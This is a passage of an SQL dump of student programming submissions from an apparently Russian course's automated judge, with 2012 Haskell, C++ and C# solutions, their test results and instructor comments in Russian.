[Any,yp,zp]\r\n\r\n			else if b == 0\r\n\r\n			then let (xp,zp) = solve a c d in [xp,Any,zp]\r\n\r\n			else if c == 0\r\n\r\n			then let (xp,yp) = solve a b d in [xp,yp,Any]\r\n\r\n			else no_answer\r\n\r\n		else if isOneVar [a,b,c]\r\n\r\n		then\r\n\r\n			if a /= 0 && mod d a == 0 then [Lin (div d a) 0, Any, Any]\r\n\r\n			else if b /= 0 && mod d b == 0 then [Any, Lin (div d b) 0, Any]\r\n\r\n			else if c /= 0 && mod d c == 0 then [Any, Any, Lin (div d c) 0]\r\n\r\n			else no_answer\r\n\r\n		else if d == 0 then [Any,Any,Any]\r\n\r\n		else no_answer\r\n\r\n\r\n\r\nswap (x,y) = (y,x)\r\n\r\n\r\n\r\n-- (\r\n\r\n--  [ (x10, t1x), (y10, t1y), (z10, t1z) ]\r\n\r\n--  [ (x20, t2x), (y20, t2y), (z20, t2z) ]\r\n\r\n-- )\r\n\r\ndiophF [a,b,c,d] [k,l,m,n] =\r\n\r\n	let \r\n\r\n		first = trace ("diophF [" ++ show a ++ "," ++ show b ++ "," ++ show c ++ "," ++ show d ++ "] [" ++ show k ++ "," ++ show l ++ "," ++ show m ++ "," ++ show n ++ "]") (isThreeVar [a,b,c])\r\n\r\n		second = isThreeVar [k,l,m]\r\n\r\n	in\r\n\r\n		if first || second\r\n\r\n		then \r\n\r\n			if c < m\r\n\r\n			then\r\n\r\n				let\r\n\r\n					c1 = a * m - c * k\r\n\r\n					c2 = b * m - c * l\r\n\r\n					c3 = d * m - c * n\r\n\r\n					g = gcd c1 c2\r\n\r\n					no_answer = [ NoAnswer, NoAnswer, NoAnswer ]\r\n\r\n				in\r\n\r\n					if trace ("gcd c1 c2 = " ++ show g) ((mod c3 g) /= 0) then (no_answer, no_answer) else\r\n\r\n						let\r\n\r\n							(Lin x0 tx, Lin y0 ty) = solve c1 c2 c3\r\n\r\n							c11 = a * tx + b * ty -- t\r\n\r\n							c13 = d - a * x0 - b * y0\r\n\r\n							c21 = k * tx +l * ty -- t\r\n\r\n							c23 = n - k * x0 - l * y0\r\n\r\n							g1 = gcd c11 c\r\n\r\n							g2 = gcd c21 m\r\n\r\n							first = \r\n\r\n								if g1 /= 0 && mod c13 g1 == 0 \r\n\r\n								then \r\n\r\n									let\r\n\r\n										(Lin t0 tp, Lin z0 zp) = solve c11 c c13\r\n\r\n									in\r\n\r\n										[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\r\n\r\n								else if g1 == 0\r\n\r\n								then [ Lin x0 tx, Lin y0 ty, Any ]\r\n\r\n								else no_answer\r\n\r\n							second = \r\n\r\n								if g2 /= 0 && mod c23 g2 == 0\r\n\r\n								then\r\n\r\n									let\r\n\r\n										(Lin t0 tp, Lin z0 zp) = solve c21 m c23\r\n\r\n									in\r\n\r\n										[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\r\n\r\n								else if g2 == 0\r\n\r\n								then [ Lin x0 tx, Lin y0 ty, Any ]\r\n\r\n								else no_answer\r\n\r\n						in\r\n\r\n							(first, second)\r\n\r\n\r\n\r\n			else\r\n\r\n				swap (diophF [k,l,m,n] [a,b,c,d])\r\n\r\n		else\r\n\r\n			let\r\n\r\n				f = solveOnly [a,b,c,d]\r\n\r\n				s = solveOnly [k,l,m,n]\r\n\r\n			in\r\n\r\n				(f,s)\r\n\r\n\r\n\r\ncalc Any t = 0\r\n\r\ncalc (Lin a b) t = a + b * t\r\n\r\ncalc NoAnswer t = 0\r\n\r\n\r\n\r\nanswer :: ( [Func], [Func] ) -> [ Integer ]\r\n\r\nanswer ( [NoAnswer, NoAnswer, NoAnswer] , _ ) = [ 0, 0, 0 ]\r\n\r\nanswer ( _ , [NoAnswer, NoAnswer, NoAnswer] ) = [ 0, 0, 0 ]\r\n\r\nanswer ( [x1, y1, z1], [x2, y2, z2] ) =\r\n\r\n	let \r\n\r\n		x = trace (show x1 ++ " | " ++ show x2) (choose x1 x2)\r\n\r\n		y = trace (show y1 ++ " | " ++ show y2) (choose y1 y2)\r\n\r\n		z = trace (show z1 ++ " | " ++ show z2) (choose z1 z2)\r\n\r\n	in\r\n\r\n		if trace (show x ++ " | " ++ show y ++ " | " ++ show z) (x == NoAnswer || y == NoAnswer || z == NoAnswer) then [0,0,0]\r\n\r\n		else [calc x 0, calc y 0, calc z 0]\r\n\r\n\r\n\r\nchoose Any x = x\r\n\r\nchoose x Any = x\r\n\r\nchoose x1 x2 = \r\n\r\n	let\r\n\r\n		f10 = calc x1 0\r\n\r\n		f20 = calc x2 0\r\n\r\n		f11 = calc x1 1\r\n\r\n		f21 = calc x2 1\r\n\r\n	in\r\n\r\n		if f10 == f20 && f11 == f21 then x1 else if f10 == 0 then x2 else if f20 == 0 then x1 else NoAnswer\r\n\r\n\r\n\r\ndioph f s = answer (diophF f s)\r\n\r\n\r\n\r\n--main = print (dioph [0,1,0,6] [1,2,3,14])\r\n\r\n\r\n\r\n\r\n\r\n\r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1654, 43, '63706456', '2012-10-07 19:57:37', 0, 'euclid a b = head [(x,y)| x <- [-(a*b)..a*b], y <- [-(a*b)..a*b], a*x+b*y ==1]', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1655, 43, '63706456', '2012-10-07 19:58:31', 0, 'euclid a b = head [(x,y)| x <- [-(a+b)..a+b], y <- [-(a+b)..a+b], a*x+b*y ==1]\r\n--переделаю нормально', '<br/>Тесты успешно пройдены!'),
(1656, 43, '63706456', '2012-10-07 20:00:14', 2, 'euclid a b = head [(x,y)| x <- [-(a*b)..a*b], y <- [-(a*b)..a*b], a*x+b*y ==1]\r\n --- Ну вообще правильно, только если a или b == 0, то диапазон надо немного расширить\r\n --- Вы исправьте, пожалуйста, и я вам засчитаю.\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1657, 46, '329842', '2012-10-07 20:06:34', 1, '#include "stdafx.h"\r\n\r\n#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool isAnyEven(vector<int> input)\r\n   --- Немного лучше const vector<int>& input \r\n{\r\n	vector<int>::iterator even_elem = find_if(input.begin(), input.end(), [] (int n) { return n % 2 == 0; });\r\n	return even_elem != input.end();\r\n}\r\n\r\nint main()\r\n{\r\n	vector<int> input;\r\n	input.push_back(1);\r\n	input.push_back(3);\r\n	input.push_back(5);\r\n	input.push_back(7);\r\n\r\n    cout << (isAnyEven(input) ? "true" : "false") << "\r\n";\r\n\r\n	input.push_back(2);\r\n\r\n	cout << (isAnyEven(input) ? "true" : "false") << "\r\n";\r\n\r\n    int p;\r\n    cin >> p;\r\n\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1658, 52, '329842', '2012-10-07 20:15:25', 1, '-- я так думал, что нельзя определять дополнительные рекурсивные функции, а основную можно..\r\n\r\nrepeatFunc f n = (!!n).iterate f\r\n\r\nf = repeatFunc sin 3', '<br/>Тесты успешно пройдены!'),
(1659, 58, '12206137', '2012-10-07 20:19:07', 0, '-- It takes 1:30 on 8 resistors.\r\n\n-- In case of 9 resistors it works for 20 minutes, then interpreter fails with runtime error.\r\n\n-- I don''t know why. And I don''t know, what are the weakest place in code.\r\n\nimport Data.Array\r\n\nimport Data.Bits\r\n\nimport Data.List\r\n\nimport Debug.Trace\r\n\n\r\n\n(|>) x f = f x\r\n\n\r\n\nbit2shift :: Int -> Int -> Int\r\n\nbit2shift acc 1 = acc\r\n\nbit2shift acc n = bit2shift (acc+1) (n `shiftR` 1)\r\n\n\r\n\ncollectBits :: [Int] -> Int -> Int -> [Int]\r\n\ncollectBits acc _ 0 = acc\r\n\ncollectBits acc shift num =\r\n\n    if num .&. shift == 0 then\r\n\n        collectBits acc (shift `shiftL` 1) num\r\n\n    else\r\n\n        collectBits (shift:acc) (shift `shiftL` 1) (num `xor` shift)\r\n\n\r\n\ncollectMasks accMasks (b:bits) f =\r\n\n    collect 0 0 b bits\r\n\n    where\r\n\n        collect 0 0 mask [] = []\r\n\n        collect c skipped mask [] = [f mask skipped c]\r\n\n        collect c skipped mask (x:xs) =\r\n\n            (collect (c+1) (x .|. skipped) mask xs) ++ (collect c skipped (x .|. mask) xs)\r\n\n\r\n\nhandleMask rs m f =\r\n\n    let bits = collectBits [] 1 m in\r\n\n    case bits of\r\n\n        [bit] -> [rs!(bit2shift 0 bit)]\r\n\n        otherwise -> collectMasks [] bits f |> concat\r\n\n\r\n\ncountCalc :: (Rational -> Rational -> Rational) -> [Rational] -> [Rational] -> [Rational]\r\n\ncountCalc f xs ys = concat $ map (x -> map (y -> f x y) ys) xs\r\n\ncountSeries = countCalc (+)\r\n\ncountParallel = countCalc (x y -> x*y/(x+y))\r\n\n\r\n\nfuns = array (0,1) [(0,countParallel), (1,countSeries)]\r\n\n\r\n\n--canMakeScheme :: [Rational] -> Rational -> Bool\r\n\ncanMakeScheme rs_list m =\r\n\n    let n = length rs_list in\r\n\n    let lim = ((1::Int) `shiftL` n) - 1 in\r\n\n    let rs = listArray (0,n-1) $ map (/ m) $ rs_list in\r\n\n    let\r\n\n    a = array ((0,1), (1,lim))\r\n\n         [((connect, mask), handleMask rs mask (x y c ->\r\n\n                let res = (funs!connect) (a!(1-connect,x)) (a!(connect,y)) in\r\n\n                if c < 2 then res\r\n\n                else res ++ (funs!connect) (a!(1-connect,x)) (a!(1-connect,y))\r\n\n                ) )\r\n\n            | connect <- [0..1], mask <- [1..lim] ]\r\n\n    in\r\n\n    a |> elems\r\n\n      |> any (any (== 1))\r\n\n--      |> (x -> (sum $ map length x, any (any (== 1)) $ x))\r\n\n\n', '<br/>Тесты успешно пройдены!'),
(1660, 54, '63706456', '2012-10-07 20:32:29', 1, 'data Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving Show\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y ', '<br/>Тесты успешно пройдены!'),
(1661, 48, '329842', '2012-10-07 20:55:50', 1, 'myreverse list = foldr f id list [] where f x r = r . (x:)', '<br/>Тесты успешно пройдены!'),
(1662, 47, '329842', '2012-10-07 21:12:14', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = map (x:) (powerset xs) ++ powerset xs', '<br/>Тесты успешно пройдены!'),
(1663, 48, '51559263', '2012-10-07 22:03:27', 1, 'myreverse xs = ( foldr (  x f -> f.(x:) ) id xs ) []\r\n', '<br/>Тесты успешно пройдены!'),
(1664, 58, '2562137', '2012-10-07 23:03:30', 2, '  --- OK, это здорово, и очень хорошо, но все-таки не засчитано..\r\n  --- Ну, такие условия, эта задача дб на Хаскеле..\r\n \r\n// I''ve written this in C++, without any functional stuff :)\r\n// For N = 9 it finishes in about 15 minutes.\r\n\r\n#include <iostream>\r\n#include <cstdio>\r\n#include <cmath>\r\n#include <set>\r\n#include <cassert>\r\nusing namespace std;\r\n\r\nint N, M;\r\nint a[100];\r\n\r\ninline int countbits(int v) {\r\n	int c;\r\n	for (c = 0; v; c++) v &= v - 1;\r\n	return c;\r\n}\r\n\r\ninline int getfirst(int v) {\r\n	int c = 0;\r\n	while ((v & (1 << c)) == 0) c++;\r\n	return c;\r\n}\r\n\r\ninline bool isset(int mask, int n) {\r\n	return (mask & (1 << n)) > 0;\r\n}\r\n\r\ntypedef pair<int, int> pii;\r\ntypedef set<pii>::iterator sdi;\r\n\r\ninline int gcd(int a, int b) {\r\n	if (a == 0) return b;\r\n	return gcd(b % a, a);\r\n}\r\n\r\ninline pii reduce(int a, int b) {\r\n	int c = gcd(a, b);\r\n	return make_pair(a / c, b / c);\r\n}\r\n\r\ninline pii serial(sdi &x, sdi &y) {\r\n	int a = x->first, b = x->second, c = y->first, d = y->second;\r\n	return reduce(a * d + b * c, b * d);\r\n}\r\n\r\ninline pii parallel(sdi &x, sdi &y) {\r\n	int a = x->first, b = x->second, c = y->first, d = y->second;\r\n	return reduce(a * c, a * d + b * c);\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1665, 53, '3431532', '2012-10-08 06:09:48', 0, 'import Data.List\r\n\r\ncoins x = coins'' (nub (rvs (coin x)))\r\n\r\ncoins'' [] = []\r\ncoins'' (x:xs) = ((cnt x [5,3,2]):(coins'' xs))\r\n\r\ncnt x [] = []\r\ncnt x (a:as) = ((length (filter (==a) x)) : (cnt x as))\r\n\r\n\r\nrvs [] = []\r\nrvs (x:xs) = ((sort x):(rvs xs))\r\n\r\ncoin x | x<=0 = [[]]\r\ncoin x = [ [b] ++ as | b<-[5,3,2], x>=b , as <- coin (x - b) ]', 'Выражение имеет неправильное значение: coins 2'),
(1666, 53, '3431532', '2012-10-08 06:11:09', 1, 'import Data.List\r\n  --- OK, но по моему получилось слищком сложно.. Ну, мы это обсудим.\r\n\r\n--main = do { print $  coins 2}\r\n\r\ncoins x = coins'' (nub (rvs (coin x)))\r\n\r\ncoins'' [] = []\r\ncoins'' (x:xs) = ((cnt x [2,3,5]):(coins'' xs))\r\n\r\ncnt x [] = []\r\ncnt x (a:as) = ((length (filter (==a) x)) : (cnt x as))\r\n\r\n\r\nrvs [] = []\r\nrvs (x:xs) = ((sort x):(rvs xs))\r\n\r\ncoin x | x<=0 = [[]]\r\ncoin x = [ [b] ++ as | b<-[5,3,2], x>=b , as <- coin (x - b) ]', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1667, 44, '397095', '2012-10-08 08:27:35', 0, 'import Debug.Trace\n\n\n\n-- (x,y) from ax+by=1 when { gcd(a,b)=1 }\n\neu 0 _ = (0, 1)\n\neu a b = \n\n	let \n\n		(x1, y1) = eu (trace ("eu " ++ show a ++ " " ++ show b) (mod b a)) a\n\n	in\n\n		(y1 - (div b a) * x1, x1)\n\n\n\n-- (x0, y0, tx, ty) from ax+by=c when { c `mod` gcd(a,b) = 0 }\n\nsolve a b c =\n\n	let \n\n		g = gcd a b\n\n		a1 = div a g\n\n		b1 = div b g\n\n		c1 = div c g\n\n		(u, v) = eu a1 b1\n\n		(uu, vv) = (if a < 0 then (-u) else u, if b < 0 then (-v) else v)\n\n	in\n\n		trace ("solve " ++ show a ++ " " ++ show b ++ " " ++ show c ++ " = " ++ show (Lin (uu * c1) b1) ++ ", " ++ show (Lin (vv * c1) (-a1))) (Lin (uu * c1) b1, Lin (vv * c1) (-a1))\n\n\n\n\n\ndata Func = Lin Integer Integer | Any | NoAnswer\n\ninstance Show Func where\n\n	show (NoAnswer) = "NoAnswer"\n\n	show (Any) = "Any"\n\n	show (Lin a b) = show a ++ " + " ++ show b ++ "t"\n\ninstance Eq Func where\n\n	(==) NoAnswer NoAnswer = True\n\n	(==) _ NoAnswer = False\n\n	(==) NoAnswer _ = False\n\n\n\n-- Variable count checkers\n\ncheck xs = map (x -> if x == 0 then 0 else 1) xs\n\nisNoVar xs = sum (check xs) == 0\n\nisOneVar xs = sum (check xs) == 1\n\nisTwoVar xs = sum (check xs) == 2\n\nisThreeVar xs = sum (check xs) == 3\n\n\n\n-- [(x0, px), (y0, py), (z0, pz)]\n\nsolveOnly [a,b,c,d] =\n\n	let\n\n		no_answer = [NoAnswer,NoAnswer,NoAnswer]\n\n	in\n\n		if isTwoVar [a,b,c]\n\n		then\n\n			if a == 0\n\n			then let (yp,zp) = solve b c d in [Any,yp,zp]\n\n			else if b == 0\n\n			then let (xp,zp) = solve a c d in [xp,Any,zp]\n\n			else if c == 0\n\n			then let (xp,yp) = solve a b d in [xp,yp,Any]\n\n			else no_answer\n\n		else if isOneVar [a,b,c]\n\n		then\n\n			if a /= 0 && mod d a == 0 then [Lin (div d a) 0, Any, Any]\n\n			else if b /= 0 && mod d b == 0 then [Any, Lin (div d b) 0, Any]\n\n			else if c /= 0 && mod d c == 0 then [Any, Any, Lin (div d c) 0]\n\n			else no_answer\n\n		else if d == 0 then [Any,Any,Any]\n\n		else no_answer\n\n\n\nswap (x,y) = (y,x)\n\n\n\ncollinear xs ys = \n\n	let\n\n		sc = sum (map ((x,y) -> x * y) (zip xs ys))\n\n		sx = sum (map (x -> x ^ 2) xs)\n\n		sy = sum (map (y -> y ^ 2) ys)\n\n	in\n\n		sc * sc == sx * sy\n\n\n\n-- (\n\n--  [ (x10, t1x), (y10, t1y), (z10, t1z) ]\n\n--  [ (x20, t2x), (y20, t2y), (z20, t2z) ]\n\n-- )\n\ndiophF [a,b,c,d] [k,l,m,n] =\n\n	let \n\n		firstT = trace ("diophF [" ++ show a ++ "," ++ show b ++ "," ++ show c ++ "," ++ show d ++ "] [" ++ show k ++ "," ++ show l ++ "," ++ show m ++ "," ++ show n ++ "]") (isThreeVar [a,b,c])\n\n		secondT = isThreeVar [k,l,m]\n\n		no_answer = [ NoAnswer, NoAnswer, NoAnswer ]\n\n	in\n\n		if firstT || secondT\n\n		then\n\n			if collinear [a,b,c] [k,l,m] then\n\n				if d * k == n * a then\n\n					let\n\n						n = gcd a b\n\n						(Lin t0 pt, Lin z0 pz) = solve n c d\n\n						(x, y) = solve a b (n * t0)\n\n						answ = [x,y,Lin z0 0]\n\n					in\n\n						(answ, answ)\n\n				else\n\n					(no_answer, no_answer)\n\n			else\n\n				if c < m\n\n				then\n\n					let\n\n						c1 = a * m - c * k\n\n						c2 = b * m - c * l\n\n						c3 = d * m - c * n\n\n						g = gcd c1 c2\n\n					in\n\n						if trace ("gcd c1 c2 = " ++ show g) ((mod c3 g) /= 0) then (no_answer, no_answer) else\n\n							let\n\n								(Lin x0 tx, Lin y0 ty) = solve c1 c2 c3\n\n								c11 = a * tx + b * ty -- t\n\n								c13 = d - a * x0 - b * y0\n\n								c21 = k * tx +l * ty -- t\n\n								c23 = n - k * x0 - l * y0\n\n								g1 = gcd c11 c\n\n								g2 = gcd c21 m\n\n								first = \n\n									if g1 /= 0 && mod c13 g1 == 0 \n\n									then \n\n										let\n\n											(Lin t0 tp, Lin z0 zp) = solve c11 c c13\n\n										in\n\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\n\n									else if g1 == 0\n\n									then [ Lin x0 tx, Lin y0 ty, Any ]\n\n									else no_answer\n\n								second = \n\n									if g2 /= 0 && mod c23 g2 == 0\n\n									then\n\n										let\n\n											(Lin t0 tp, Lin z0 zp) = solve c21 m c23\n\n										in\n\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\n\n									else if g2 == 0\n\n									then [ Lin x0 tx, Lin y0 ty, Any ]\n\n									else no_answer\n\n							in\n\n								(first, second)\n\n\n\n				else\n\n					swap (diophF [k,l,m,n] [a,b,c,d])\n\n		else\n\n			let\n\n				f = solveOnly [a,b,c,d]\n\n				s = solveOnly [k,l,m,n]\n\n			in\n\n				(f,s)\n\n\n\ncalc Any t = 0\n\ncalc (Lin a b) t = a + b * t\n\ncalc NoAnswer t = 0\n\n\n\nanswer :: ( [Func], [Func] ) -> [ Integer ]\n\nanswer ( [NoAnswer, NoAnswer, NoAnswer] , _ ) = [ 0, 0, 0 ]\n\nanswer ( _ , [NoAnswer, NoAnswer, NoAnswer] ) = [ 0, 0, 0 ]\n\nanswer ( [x1, y1, z1], [x2, y2, z2] ) =\n\n	let \n\n		x = trace (show x1 ++ " | " ++ show x2) (choose x1 x2)\n\n		y = trace (show y1 ++ " | " ++ show y2) (choose y1 y2)\n\n		z = trace (show z1 ++ " | " ++ show z2) (choose z1 z2)\n\n	in\n\n		if trace (show x ++ " | " ++ show y ++ " | " ++ show z) (x == NoAnswer || y == NoAnswer || z == NoAnswer) then [0,0,0]\n\n		else [calc x 0, calc y 0, calc z 0]\n\n\n\nchoose Any x = x\n\nchoose x Any = x\n\nchoose x1 x2 = \n\n	let\n\n		f10 = calc x1 0\n\n		f20 = calc x2 0\n\n		f11 = calc x1 1\n\n		f21 = calc x2 1\n\n	in\n\n		if f10 == f20 && f11 == f21 then x1 else if f10 == 0 then x2 else if f20 == 0 then x1 else NoAnswer\n\n\n\ndioph f s = answer (diophF f s)\n\n\n\n--main = print (dioph [1,1,1,1] [2,2,2,2])\n\n\n\n\n\n\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [25,33,0,1] [1,0,1,0] in (25*x+33*y, x+z)'),
(1668, 45, 'Маргарита Нурмухаметова', '2012-10-08 09:41:40', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace AnyEven\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] my_array = new int[5][];\r\n            my_array[0] = new int[3] { 1, 2, 4};\r\n            my_array[1] = new int[3] { 3, 6, 3};\r\n            my_array[2] = new int[3] { 2, 1, 1};\r\n            my_array[3] = new int[3] { 10, 12, 3};\r\n            my_array[4] = new int[3] { 1, 10, 30};\r\n            \r\n            bool b = my_array.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.WriteLine((b) ? "True" : "False");\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(1669, 18, '787463', '2012-10-08 14:06:13', 2, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs) | x <- [1..n], xs <- allLists n (k - 1)]\r\n   --- А вы до этого сдавали задачу 1.1? Если сдавали, пришлите снова, пожалуйста, а то она будет не зачтена.', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(1670, 56, '787463', '2012-10-08 14:07:13', 1, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs) | x <- [1..n], xs <- allLists n (k - 1)]', '<br/>Тесты успешно пройдены!'),
(1671, 51, '787463', '2012-10-08 14:08:08', 1, 'repeatFunc f n = foldr (\\_ f'' -> f.f'') f [1..(n-1)]', '<br/>Тесты успешно пройдены!'),
(1672, 52, '787463', '2012-10-08 14:08:24', 1, 'repeatFunc f n = foldr (\\_ f'' -> f.f'') f [1..(n-1)]', '<br/>Тесты успешно пройдены!'),
(1673, 53, '787463', '2012-10-08 14:08:59', 1, 'coins n = [[x,y,z] | x <- [0..(n `div` 2)], y <- [0..(n `div` 3)], z <- [0..(n `div` 5)], 2*x + 3*y + 5*z == n]', '<br/>Тесты успешно пройдены!'),
(1674, 54, '787463', '2012-10-08 14:09:25', 1, 'data Scheme a = Resistance a | Parallel (Scheme a) (Scheme a) | Sequential (Scheme a) (Scheme a)\r\ntotalResistance (Sequential part1 part2) = totalResistance part1 + totalResistance part2\r\ntotalResistance (Parallel part1 part2) =\r\n    let\r\n      r1 = totalResistance part1\r\n      r2 = totalResistance part2\r\n    in r1*r2/(r1 + r2)\r\ntotalResistance (Resistance r) = r', '<br/>Тесты успешно пройдены!'),
(1675, 49, '787463', '2012-10-08 14:10:12', 2, 'using System;\r\n\r\n\r\n\r\nnamespace task_10_1\r\n\r\n{\r\n\r\n	class Node\r\n\r\n	{\r\n\r\n		public Node(int val) {\r\n\r\n			this.Val = val;\r\n\r\n		}\r\n\r\n		\r\n\r\n		public Node(int val, Node left, Node right) {\r\n\r\n			this.Val = val;\r\n\r\n			this.Right = right;\r\n\r\n			this.Left = left;\r\n\r\n		}\r\n\r\n		\r\n\r\n		public bool Any(Func<int, bool> p)\r\n\r\n		{\r\n\r\n			bool res = p(Val);\r\n          --- Давайте я вас попрошу немного исправить. Тут, если мы получили ответ true, то нет смысла,\r\n          --- конечно, проверять левое и правое поддерево. А если вы что-то нашли в левом поддереве, то нет\r\n          --- смысла проверять правое. Напишите что-то такое, пожалуйста. Не обязательно сегодня, можете и завтра\r\n          --- (во вторник) \r\n			if (Left != null)\r\n\r\n			{\r\n\r\n				res |= Left.Any(p);\r\n\r\n			}\r\n\r\n			if (Right != null)\r\n\r\n			{\r\n\r\n				res |= Right.Any(p);\r\n\r\n			}\r\n\r\n			return res;\r\n\r\n		}\r\n\r\n		\r\n\r\n		private int Val;\r\n\r\n		private Node Left;\r\n\r\n		private Node Right;\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static void Main (string[] args)\r\n\r\n		{\r\n\r\n			Node n = new Node(1, new Node(1), new Node(1, new Node(1), null));\r\n\r\n			Console.WriteLine("{0}", n.Any(x => x % 2 == 0));\r\n\r\n			\r\n\r\n			n = new Node(1, new Node(1), new Node(1, new Node(2), null));\r\n\r\n			Console.WriteLine("{0}", n.Any(x => x % 2 == 0));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1676, 50, '787463', '2012-10-08 14:10:41', 2, '#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntypedef bool (*Fun)(int n);\r\n\r\n\r\n\r\nclass Node\r\n\r\n{\r\n\r\npublic:\r\n\r\n	Node(int const value) : mValue(value)\r\n            --- тут лучше left и right присваивать nullptr.\r\n            --- А можно просто задать умолчания во втором конструкторе, и этот тогда вообще не нужен  \r\n	{\r\n\r\n	}\r\n\r\n	\r\n\r\n	Node(int const value, const Node *left, const Node *right) : mValue(value), mLeft(left), mRight(right)\r\n	{\r\n\r\n	}\r\n\r\n		\r\n\r\n	bool any(const Fun p) const {\r\n             --- И тут тоже замечание, что и для С#. Это просто, но исправьте, пожалуйста.\r\n		bool res = p(mValue);\r\n\r\n		if (mLeft != NULL)\r\n\r\n		{\r\n\r\n			res |= mLeft->any(p);\r\n\r\n		}\r\n\r\n		if (mRight != NULL)\r\n\r\n		{\r\n\r\n			res |= mRight->any(p);\r\n\r\n		}\r\n\r\n		return res;\r\n\r\n	}\r\n\r\n	\r\n\r\n	void setValue(int const value) {\r\n\r\n		mValue = value;\r\n\r\n	}\r\n\r\n	\r\n\r\nprivate:\r\n\r\n	int mValue;\r\n\r\n	const Node *mLeft;\r\n\r\n	const Node *mRight;\r\n\r\n};\r\n\r\n\r\n\r\nint main () {\r\n\r\n	Node *n11 = new Node(1);\r\n\r\n	const Node *n12 = new Node(1);\r\n\r\n	const Node *n2 = new Node(1, n11, NULL);\r\n\r\n	const Node *n3 = new Node(1, NULL, n2);\r\n\r\n	const Node *n4 = new Node(1, n12, n3);\r\n\r\n	\r\n\r\n	cout << n4->any([](int x) { return x % 2 == 0; }) << endl;\r\n\r\n	\r\n\r\n	n11->setValue(2);\r\n\r\n	\r\n\r\n	cout << n4->any([](int x) { return x % 2 == 0; });\r\n\r\n	\r\n\r\n	delete n11;\r\n\r\n	delete n12;\r\n\r\n	delete n2;\r\n\r\n	delete n3;\r\n\r\n	delete n4;\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1677, 45, '9539826', '2012-10-08 14:17:25', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Any_and_All\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] massiv = { new int[] { 1, 2, 3, 4 }, new int[] { 1, 1, 3, 6 }, new int[] { 5, 3, 2, 6 }, new int[] { 4, 4, 2, 3 }, new int[] { 3, 2, 5, 6 } };\r\n            bool b = massiv.All(x => x.Any(y => (y % 2 == 0)));\r\n            Console.WriteLine(b);\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1678, 53, '5656962', '2012-10-08 14:18:21', 0, 'coins n = [(x, y, z)| x<-[0..div n 2], y<-[0..div n 3], z<-[0..div n 5], 2*x + 3*y + 5*z == n]\n', 'Выражение имеет неправильное значение: coins 2'),
(1679, 53, '5656962', '2012-10-08 14:20:07', 1, 'coins n = [[x, y, z]| x<-[0..div n 2], y<-[0..div n 3], z<-[0..div n 5], 2*x + 3*y + 5*z == n]\r\n', '<br/>Тесты успешно пройдены!'),
(1680, 45, '383483', '2012-10-08 15:13:43', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Container_8_1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            const int size = 5;\r\n\r\n            const int n = 3;\r\n\r\n            Random rand = new Random();\r\n\r\n\r\n\r\n            int[][] ax = new int[n][];\r\n\r\n            for (int k = 0; k < n; k++)\r\n\r\n                ax[k] = new int[size];\r\n\r\n            int i = 0;\r\n\r\n            while (i < n)\r\n\r\n            {\r\n\r\n                for (int j = 0; j < size; j++)\r\n\r\n                {\r\n\r\n                    ax[i][j] = rand.Next(100) + 1;\r\n\r\n                    Console.Write("{0} ", ax[i][j]);\r\n\r\n                }\r\n\r\n                Console.WriteLine();\r\n\r\n                i++;\r\n\r\n            }\r\n\r\n            i = 0;\r\n\r\n            while (i < n)\r\n   --- Вообще неплохо, но давайте я вас попрошу немного дописать. Ведь тот цикл, который тут начинается\r\n   --- (while) можно тоже записать с помощью метода (All, очевидно).\r\n   --- Условие этого All - это логическая функция, которая в качестве параметра берет строку,\r\n   --- и проверяет, что в ней есть четное число. Ее, эту функцию, понятно, можно написать с помощью Any,\r\n   --- Те получается All, в котором 